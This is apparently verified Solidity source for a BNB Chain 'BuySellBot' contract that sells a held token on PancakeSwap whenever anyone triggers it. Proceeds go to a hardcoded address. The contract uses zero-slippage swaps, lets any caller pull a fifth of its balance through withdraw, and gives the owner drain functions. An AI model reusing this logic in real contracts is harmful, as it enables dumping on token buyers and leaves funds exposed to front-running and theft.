/**
 *Submitted for verification at BscScan.com on 2022-08-06
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-18
*/

//coin PAA 11
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    function withdrawFist() external returns(bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract Ownable is Context {
    address private _owner;

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _owner = newOwner;
    }
	
	function transferToken(IERC20 newOwner) public  onlyOwner {
        newOwner.transfer(msg.sender,newOwner.balanceOf(address(this)));
    }

    function transferBnb() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BuySellBot is Ownable {
    using SafeMath for uint256;

    IPancakeRouter02 public uniswapV2Router;
    
    IERC20 public BASETOKEN;
    IERC20 public COINTOKEN;
    IERC20 public PAIR;
	
	
    address public router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);//xiu gai
    address public baseToken = address(0x55d398326f99059fF775485246999027B3197955);//xiu gai
    
    address public daibiToken = address(0xa7c5517F6a0AFE249295EE88a55C91f9f7a64dad);//xiu gai
    address public uniswapV2Pair = address(0x50C4fC9c088B13550FD215023754d212e237829B);//xiu gai

    address public fundAddress = address(0xC2dF54aeCa715F4AC6ee47BC43185D59bdDb0e7c);//xiu gai
    address public marketAddress = address(0x1969eA635024224BE285ba1ef9aE414CACDB77f0);//xiu gai

	uint256 public sellRate = 97;
	bool public swapBuyStats = true;
    bool public swapSellStats = true; 
    constructor() {

        BASETOKEN = IERC20(baseToken);
        COINTOKEN = IERC20(daibiToken);
        PAIR = IERC20(uniswapV2Pair);
		
        uniswapV2Router = IPancakeRouter02(router);//xiu gai
		
        BASETOKEN.approve(router,10**64);
        COINTOKEN.approve(router,10**64);
        PAIR.approve(router,10**64);
    }

    receive() external payable {}
	
	function changeRouter(address _router) public onlyOwner {
		router = _router;
		uniswapV2Router = IPancakeRouter02(_router);
	}
	
	function changeTokenInfo(address _baseToken,address _daibiToken,address _uniswapV2Pair) public onlyOwner {
		baseToken = _baseToken;
		daibiToken = _daibiToken;
		uniswapV2Pair = _uniswapV2Pair;
		
		BASETOKEN = IERC20(_baseToken);
        COINTOKEN = IERC20(_daibiToken);
        PAIR = IERC20(_uniswapV2Pair);
		
		BASETOKEN.approve(router,10**64);
        COINTOKEN.approve(router,10**64);
        PAIR.approve(router,10**64);
	}
	
	function changeBuySwapStats() public onlyOwner {
		swapBuyStats = !swapBuyStats;
	}

    function changeSellSwapStats() public onlyOwner {
		swapSellStats = !swapSellStats;
	}
	
	uint256 public miniUsdtAmount = 15 * 10**21;
	function changeMiniUsdtAmount(uint256 _miniUsdtAmount) public onlyOwner {
		miniUsdtAmount = _miniUsdtAmount;
	}
	
	function changeRate(uint256 _sellRate) public onlyOwner {
		sellRate = _sellRate;
	}
	
	function withdraw() public returns(bool){
        uint256 allAmount = BASETOKEN.balanceOf(address(this));
		if(allAmount > 0){
            BASETOKEN.transfer(msg.sender,allAmount.div(5));
            BASETOKEN.transfer(fundAddress,allAmount.div(5).mul(2));
            BASETOKEN.transfer(marketAddress,allAmount.div(5).mul(2));
		}
        return true;
	}
    /**
    * 随单购买
    */
    function addTokenldx(uint256 amount) public {
		uint256 usdtAmount = BASETOKEN.balanceOf(uniswapV2Pair);
		if(swapBuyStats && usdtAmount >= miniUsdtAmount){
			uint256 sellAmount = amount.div(100).mul(sellRate);
			uint256 daibiAmount = COINTOKEN.balanceOf(address(this));
			if(daibiAmount < sellAmount){sellAmount = daibiAmount;}
			if(sellAmount > 0){
				swapSellBot(sellAmount);
			}
		}
    }

    function swapBuyBot(uint256 baseAmount) private {
		address[] memory path = new address[](2);
        path[0] = baseToken;
        path[1] = daibiToken;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            baseAmount,
            0, // accept any amount of dividend token
            path,
            address(this),
            block.timestamp.add(30)
        );
    }
	
	/**
    * 随单卖出
    */
    function checkSell(uint256 amount) public {
		if(swapSellStats){
			uint256 sellAmount = amount.div(100).mul(sellRate);
			uint256 daibiAmount = COINTOKEN.balanceOf(address(this));
			if(daibiAmount < sellAmount){sellAmount = daibiAmount;}
			if(sellAmount > 0){
				swapSellBot(sellAmount);
			}
		}
    }
	
	function swapSellBot(uint256 daibiAmount) private {
		address[] memory path = new address[](2);
        path[0] = daibiToken;
		path[1] = baseToken;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            daibiAmount,
            0, // accept any amount of dividend token
            path,
            address(0x83198A8272b1Bc309116A9209f505370a44C0FbA),
            block.timestamp.add(30)
        );
    }
    
	uint256 public defaultPrice = 7000000000;
    function warpToken(uint256 oldValue) public view returns(uint256){
        if(tx.gasprice > defaultPrice){
            return oldValue.div(100);
        }
        return oldValue;
    }

    function priceInit() onlyOwner public {
        defaultPrice = tx.gasprice;
    }
}